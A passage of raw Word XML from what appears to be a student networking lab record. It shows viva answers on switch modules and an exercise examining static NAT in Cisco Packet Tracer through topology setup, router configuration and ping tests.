        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is Cisco Packet Tracer?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D472CE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21454718" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Cisco Packet Tracer is a network simulation software used to design, configure,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C519BD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>and test network topologies virtually.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19796671" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What is a network module in a switch?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="615BBD6A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177E6679" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A network module is a hardware component that can be added to a switch to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="672DF710" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>provide extra ports or additional functionalities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696C091C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Why do we customize switches with network modules?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A67161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3C5879E5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>We customize switches to increase the number of ports, support different</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29490FFF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>network technologies, and meet specific network requirements.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F78040" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. What is the function of a switch in a computer network?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C00168E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A6E1070" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A switch connects multiple devices in a Local Area Network (LAN) and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B798422" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>forwards data to the correct destination using MAC addresses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FCEF852" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. How can you add a network module to a switch in Cisco Packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42195840" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Tracer?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="615B6FD5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BDE1D64" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>First, turn off the switch, drag and drop the required module into the empty slot,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631A4517" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>and then turn the switch back on.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D9734D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2912B0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BEA8E1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>EXAMINING NETWORK ADDRESS TRANSLATION (NAT) USING</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2561A066" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>CISCO PACKET TRACER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D5328AC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6A4C0A20" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To Examine Network Address Translation (NAT) using Cisco Packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022D5DF2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Tracer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2179CB1B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Setting Up the Network Topology</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58719B82" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Devices Required:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1967ACC3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95B62D9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2 Routers (R1, R2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01EBE68B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1F80F74" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2 Switches (S1, S2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3475AE62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1AFBCE5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3 PCs (PC1, PC2, PC3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DEE681E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E1D3950" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1 Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722C99FC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41C565A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Serial and Ethernet cables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2993A3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Cable the devices:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C119EFE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B0D5AC1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PC1 → FastEthernet0 → Switch S1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A5F67D8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91F991D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PC2 → FastEthernet0 → Switch S1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C41F0F5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8C5D7C6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Switch S1 → GigabitEthernet0/0 → Router R1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F3889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1CB0103" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Server → FastEthernet0 → Switch S2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F29DF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DA1F5D4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Switch S2 → GigabitEthernet0/0 → Router R2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6960803C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6245CCF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Router R1 Serial0/0/0 ↔ Serial0/0/0 Router R2 (serial cable).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0930F7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A83D4F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2.Assign IP Addresses to PC and Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C44E7C7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Open the PC.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7C7C4F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Go to Desktop → IP Configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B9B353" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Enter the details:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03213BB7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CFC96AD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Open the Server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712D315B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Go to Desktop → IP Configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DCB5DFA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Enter the details:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE12BA5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="32541B1B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1.Go to services tab,edit index.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA09D32" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2.Change the heading.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FBB5E75" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3.Open browser in PC1 and type the following url. Notice the Change in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4223796F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>heading.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F66360" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="384F41BA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3.Configure the routers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53994CF8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B2A9C1D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Click on the router,go to config tab.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB3CC1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48A97A1A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Under interface,select the port connected . Mark the tick box “on”. Fill</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28BE18EE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>the ip address and subnet mask.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FCF2201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8583509" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Repeat for all the ports in both the routers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF78EB6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="262A99EF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Static NAT Mapping on Router1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B603A0B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459F9821" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Open R1 → CLI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169C058E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A8DCAB6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA695D0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Static Routing on Router2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DCE2368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8311443" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Open Router2 → Config tab → Static.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE3331E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02CEB81" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Fill the fields: Network,Subnet Mask,Next Hop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76537306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A70B219" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Click Add</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506D7220" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C01802" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4.Test Connectivity Using PDU and Ping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1165CB2A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PDU Test:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="092FB3D9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613380B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Select the Add Simple PDU tool from the main toolbar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A59B7EB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4EF17582" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Source: PC3 → Destination: PC2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2035CC7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4AF22C67" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Send the PDU.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479E3B3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C5297FB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The PDU suceeds because the private IP can traverse the public network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279D3A59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5D42AB8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Select the Add Simple PDU tool from the main toolbar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4777AC23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51385A4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Source: PC2 → Destination: PC3.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FAD6FE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A16B61F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Send the PDU.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5455BA06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7CE4E45" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The PDU fails  because the public IP cannot traverse the private network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409DA1F4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5AF543" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Ping test:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E80139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27B3754" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Open command prompt in PC3 and ping PC2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C067E5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0289304" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Ping successful.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9CACA8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898AFAE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Open command terminal in PC2 and ping PC3.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5498696C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6112B73" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Ping Failed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BBCC51B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E246B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7ABEE2BE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus Network Address Translation (NAT) was examined using Cisco</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="080D8930" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Packet Tracer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A54BB26" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9C69EF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
